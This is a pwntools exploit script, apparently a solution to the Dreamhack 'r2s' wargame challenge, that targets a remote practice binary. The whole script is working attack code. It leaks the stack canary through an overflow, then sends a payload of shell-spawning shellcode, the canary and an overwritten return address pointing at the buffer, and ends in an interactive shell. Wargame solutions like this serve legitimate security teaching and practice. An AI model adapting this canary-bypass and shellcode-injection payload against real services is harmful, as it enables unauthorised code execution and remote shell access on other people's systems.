from pwn import *
context(arch='amd64')

REMOTE = True

if not REMOTE:
    r = process('./release/r2s')
else:
    r = remote('host2.dreamhack.games', 15215)

r.recvuntil('Address of the buf: 0x')
buf = int(r.recvline()[:-1], 16)

# leak canary
r.sendafter('Input: ', 'a' * 0x59)
r.recvuntil('Your input is \'' + 'a' * 0x59)
canary = u64(r.recvn(7).rjust(8, b'\x00'))

# return to shellcode
shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(0x58, b'a')
payload += p64(canary) # canary
payload += b'a' * 0x8 # sfp
payload += p64(buf) # return address
r.sendlineafter('Input: ', payload)

r.interactive()